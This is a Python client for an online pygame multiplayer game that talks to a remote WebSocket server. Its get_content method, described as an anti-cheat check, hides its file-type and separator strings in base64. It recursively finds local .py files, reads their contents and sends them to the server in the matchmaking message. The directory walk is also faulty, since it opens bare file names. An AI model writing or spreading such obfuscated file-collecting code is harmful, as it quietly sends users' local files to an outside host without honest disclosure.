import binascii
import random
import string
import os
import hashlib
import base64
import sys

import numpy as np
from websocket import create_connection

import pygame
from pygame.math import Vector2 as Vec2

import _thread
from player import Player


class Client:
    #link = "ws://online-pong-websocket.herokuapp.com/0.0.0.0"
    link = "wss://survivoriomultiplayer.onrender.com"

    def __init__(self):
        self.win = None

        username = input("Type your username: ")
        if username == "":
            numbers = "0123456789"
            username = ''.join(random.sample(string.ascii_letters + numbers, 10))  # Generate a random link

        self.player = Player(username)

        self.players = {}      # Exclude himself

        self.session_id = None
        self.websocket = None

        self.has_game_started = False

        self.background_color = (250, 212, 117)

        self.play()

    def play(self):

        self.websocket = create_connection(self.link)
        self.on_open()
        _thread.start_new_thread(self.on_message, ())
        while True:
            if self.has_game_started:
                self.start()

    def on_message(self):
        while True:
            message = self.websocket.recv()
            result = message.split(",")
            if result[0] == "GameInfo":
                for r in result[1::]:
                    player_id, infos = r.split(":")
                    infos = infos.split("/")
                    pos = Vec2((int(infos[0]), int(infos[1])))
                    player = self.players[player_id]
                    player.position = pos
                    player.angle = int(infos[2])

            elif result[0] == "MatchmakingInfo":
                self.session_id = result[1]
                self.player.id = result[2]
                print("Matchmaking... [" + result[3] + "/" + result[4] + "]")

            elif result[0] == "OnNewPlayerJoin":
                new_player = Player(result[2])
                new_player.id = result[1]
                self.players[new_player.id] = new_player
                print(f"{new_player.username} joined the server ! [" + result[3] + "/" + result[4] + "]")

            elif result[0] == "StartInfo":
                self.has_game_started = True

    def on_open(self):
        content = self.get_content()
        print("Matchmaking...")
        self.websocket.send("Matchmaking," + self.player.username + "," + content)

    def start(self):
        print("Game started")

        self.win = pygame.display.set_mode((600, 600))
        self.player.win = self.win
        self.player.on_start()

        for player in self.players.values():
            player.win = self.win
            player.on_start()

        screen_center = self.get_screen_center()


        while True:
            # Main Loop
            self.win.fill(self.background_color)
            events = pygame.event.get()
            mouse_pos = Vec2(pygame.mouse.get_pos())
            for event in events:
                if event.type == pygame.QUIT:
                    sys.exit()

            delta = screen_center - self.player.position  # Used to make the player always centered on the screen

            self.player.frame(mouse_pos, events)
            self.player.draw(delta=delta)

            for player in self.players.values():
                player.draw(delta=delta)

            self.websocket.send("GameInfo," + self.session_id + "," + self.player.id + "," + self.get_player_info())

            pygame.display.update()

    def get_player_info(self):
        return f"{int(self.player.position[0])},{int(self.player.position[1])}"

    def get_screen_center(self):
        return np.array((self.win.get_width() / 2, self.win.get_height() / 2))

    def get_content(self):
        # Anti-cheat system. Reads all the files in the directory and send them to the server, so it can check if they have not been modified
        r = "LnB5"
        fs = []
        d = '.'
        for n, _, l in os.walk(d):
            for na in l:
                if na.endswith(base64.b64decode(r.encode('utf-8')).decode('utf-8')):
                    fs.append(na)

        r1 = "Ly8v"
        r2 = "fHx8"
        e = []
        for f in fs:
            with open(f, 'r') as fi:
                e.append(f+base64.b64decode(r2.encode('utf-8')).decode('utf-8')+fi.read())
        return r1.join(e)



client = Client()
